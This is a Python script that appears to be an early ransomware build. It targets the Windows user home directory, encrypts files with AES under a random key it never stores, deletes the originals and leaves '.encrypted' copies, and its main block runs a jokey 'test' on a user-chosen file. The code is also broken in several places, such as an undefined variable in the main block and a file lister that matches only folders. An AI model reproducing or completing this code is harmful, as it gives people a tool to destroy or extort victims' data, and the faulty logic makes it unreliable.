import time
import glob
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from multiprocessing import cpu_count
from concurrent.futures import ThreadPoolExecutor
from os import path, getlogin, scandir
from string import ascii_uppercase

MAIN_DRIVE = 'C:'
WINDOWS_USERS_DIR = 'Users'


class Crypto():
    def __init__(self, key_size, iv_size):
        self.num_threads = cpu_count()
        self.pool = ThreadPoolExecutor(max_workers=1)
        self.home_directory = self._get_home_dir()
        key = os.urandom(key_size)
        iv = os.urandom(iv_size)
        self.cipher = Cipher(algorithms.AES(
            key), modes.OFB(iv), backend=default_backend())

    def _get_home_dir(self):
        current_user = getlogin()
        home_dir = path.join(MAIN_DRIVE, WINDOWS_USERS_DIR, current_user)
        return home_dir

    def get_files(self):
        return glob.glob(path.join(self.home_directory, './**/'), recursive=True)

    def encrypt_file(self, filename):
        encryptor = self.cipher.encryptor()
        plaintext = open(filename, 'rb').read()
        ciphertext = encryptor.update(
            plaintext) + encryptor.finalize()
        os.remove(filename)
        open(filename + '.encrypted', 'wb').write(ciphertext)

    def decrypt_file(self, filename):
        decryptor = self.cipher.decryptor()
        encryptor = self.cipher.decryptor()
        ciphertext = open(filename, 'rb').read()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        os.remove(filename)
        open(filename[:len(filename)-10], 'wb').write(plaintext)


if __name__ == "__main__":
    user_crypt = Crypto(32, 16)
    print("What's up friends. Here's a test of our encryption / decryption with a nice new rando key. Throw a file in there just in case you dont trust us")
    enc_filename = input('File to be encrypted: ')
    user_crypt.encrypt_file(filename)
    user_crypt.decrypt_file(filename)
